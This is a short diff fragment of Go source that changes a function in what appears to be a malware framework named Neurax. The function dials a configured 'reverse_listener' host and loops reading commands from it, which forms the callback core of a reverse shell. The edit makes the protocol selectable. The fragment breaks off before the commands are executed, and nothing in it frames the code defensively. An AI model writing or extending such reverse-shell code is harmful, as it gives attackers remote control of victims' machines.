@@ -256,8 +256,8 @@ func NeuraxOpenComm() {
 	}
 }
 
-func NeuraxReverse() {
-	conn, _ := net.Dial("udp", NeuraxConfig.reverse_listener)
+func NeuraxReverseTCP(proto string) {
+	conn, _ := net.Dial(proto, NeuraxConfig.reverse_listener)
 	for {
 		command, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
